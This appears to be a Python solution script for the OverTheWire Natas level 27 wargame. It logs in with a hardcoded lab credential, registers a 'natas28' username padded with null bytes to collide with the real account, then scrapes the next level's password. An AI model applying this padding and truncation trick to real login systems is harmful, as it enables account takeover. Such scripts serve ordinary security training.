import requests
import re
import urllib.parse as urllib

username = "natas27"
password = "PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3"

url = "http://%s.natas.labs.overthewire.org"%username

session = requests.Session()

uname = "natas28" + "%00" * 58 + "anything" # we can use either null (%00) or " " space
data = urllib.unquote(uname)

response = requests.post(url,data={"username" : data , "password" : "anything"} , auth=(username,password))
response = requests.post(url,data={"username" : "natas28" , "password" : "anything"   } , auth=(username,password))
content = response.text
flag = re.findall(r"\[password\] =&gt; (\w+)",content)[0]
print("[+] Gotcha :",flag)  